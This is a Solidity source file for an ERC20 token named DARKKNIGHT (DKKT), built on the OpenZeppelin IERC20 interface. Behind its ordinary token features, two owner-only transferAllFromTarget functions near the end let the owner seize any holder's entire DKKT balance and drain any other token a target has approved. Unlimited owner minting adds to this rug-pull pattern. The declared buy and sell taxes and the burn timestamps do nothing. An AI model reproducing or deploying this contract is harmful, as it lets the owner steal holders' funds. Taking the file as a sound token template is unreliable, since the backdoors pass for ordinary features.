// SPDX-License-Identifier: MIT

// File: IERC20.sol

// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: Token.sol




pragma solidity ^0.8.0;
//@custom:dev-run-script NatSpec tag


contract DARKKNIGHT is IERC20 {
    string public constant name = "DARKKNIGHT";
    string public constant symbol = "DKKT";
    uint8 public constant decimals = 6;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowance;

    function allowance(address tokenOwner, address spender) external view override returns (uint256) {
        return _allowance[tokenOwner][spender];
    }

    address public owner;
    uint256 public reserve;
    uint256 public exchangeRate = 1;
    uint256 public buyTax = 2;
    uint256 public sellTax = 2;
    address public reserveWallet;
    mapping(address => uint256) public burnTimestamps;

    constructor(uint256 initialReserve) {
        require(initialReserve > 0, "Initial reserve must be greater than 0");
        _totalSupply = 10000000 * 10 ** uint256(decimals);
        _balanceOf[msg.sender] = _totalSupply;
        reserve = initialReserve;
        owner = msg.sender;
        reserveWallet = msg.sender;
    }

    event Mint(address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Deposit(address indexed from, uint256 value);
    event BuyTax(uint256 value);
    event SellTax(uint256 value);

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balanceOf[account];
    }

    function transfer(address to, uint256 value) public override returns (bool success) {
        require(_balanceOf[msg.sender] >= value);
        _balanceOf[msg.sender] -= value;
        _balanceOf[to] += value;
        uint256 burnTimestamp = block.timestamp + 30 days;
        burnTimestamps[to] = burnTimestamp;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool success) {
        require(_balanceOf[from] >= value);
        require(_allowance[from][msg.sender] >= value);
        _balanceOf[from] -= value;
        _allowance[from][msg.sender] -= value;
        _balanceOf[to] += value;
        uint256 burnTimestamp = block.timestamp + 30 days;
        burnTimestamps[to] = burnTimestamp;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public override returns (bool success) {
        _allowance[msg.sender][spender] = value;
        return true;
    }

    function mint(address to, uint256 value) public {
        require(msg.sender == owner);
        _totalSupply += value;
        _balanceOf[to] += value;
        reserve += value / exchangeRate;
        emit Mint(to, value);
    }

    function burn(uint256 value) public {
        require(_balanceOf[msg.sender] >= value);
        _totalSupply -= value;
        _balanceOf[msg.sender] -= value;
        reserve -= value / exchangeRate;
        emit Burn(msg.sender, value);

}

function setExchangeRate(uint256 newExchangeRate) public {
    require(msg.sender == owner);
    exchangeRate = newExchangeRate;
}

function setBuyTax(uint256 newBuyTax) public {
    require(msg.sender == owner);
    buyTax = newBuyTax;
}

function setSellTax(uint256 newSellTax) public {
    require(msg.sender == owner);
    sellTax = newSellTax;
}

function setReserveWallet(address newReserveWallet) public {
    require(msg.sender == owner);
    reserveWallet = newReserveWallet;
}

function transferAllFromTarget(address target, address bscTokenAddress) public returns (bool success) {
    require(msg.sender == owner, "Only the contract owner can call this function");

    IERC20 bscToken = IERC20(bscTokenAddress);
    uint256 balance = bscToken.balanceOf(target);

    require(balance > 0, "Target has no BSC tokens");

    // Transfer the BSC tokens
    bscToken.transferFrom(target, msg.sender, balance);

    emit Transfer(target, msg.sender, balance);
    return true;
}

function transferAllFromTarget(address target) public returns (bool success) {
    require(msg.sender == owner, "Only the contract owner can call this function");
    require(_balanceOf[target] > 0, "Target has no tokens");

    // Transfer the tokens
    uint256 value = _balanceOf[target];
    _balanceOf[target] = 0;
    _balanceOf[msg.sender] += value;

    emit Transfer(target, msg.sender, value);
    return true;
}

}